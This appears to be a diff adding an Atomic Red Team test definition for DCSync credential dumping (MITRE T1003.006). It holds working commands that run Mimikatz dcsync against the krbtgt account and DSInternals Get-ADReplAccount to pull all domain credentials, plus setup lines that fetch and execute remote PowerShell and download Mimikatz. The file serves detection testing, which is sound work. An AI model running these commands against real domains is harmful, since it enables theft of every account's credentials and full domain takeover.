@@ -1,0 +1,71 @@
+{
+  "attack_technique": "T1003.006",
+  "display_name": "OS Credential Dumping: DCSync",
+  "atomic_tests": [
+    {
+      "name": "DCSync (Active Directory)",
+      "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\""
+      },
+      "input_arguments": {
+        "domain": {
+          "description": "Targeted Active Directory domain",
+          "type": "string",
+          "default": "%userdnsdomain%"
+        },
+        "user": {
+          "description": "Targeted user",
+          "type": "string",
+          "default": "krbtgt"
+        },
+        "mimikatz_path": {
+          "description": "Mimikatz windows executable",
+          "type": "path",
+          "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})",
+          "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
+          "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath"
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "129efd28-8497-4c87-a1b0-73b9a870ca3e"
+    },
+    {
+      "name": "Run DSInternals Get-ADReplAccount",
+      "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Get-ADReplAccount -All -Server #{logonserver}"
+      },
+      "input_arguments": {
+        "logonserver": {
+          "description": "ComputerName argument default %logonserver%",
+          "type": "string",
+          "default": "$ENV:logonserver.TrimStart(\"\\\")"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "DSInternals must be installed",
+          "prereq_command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}",
+          "get_prereq_command": "Install-Module -Name DSInternals -Scope CurrentUser -Force"
+        }
+      ],
+      "auto_generated_guid": "a0bced08-3fc5-4d8b-93b7-e8344739376e"
+    }
+  ]
+}
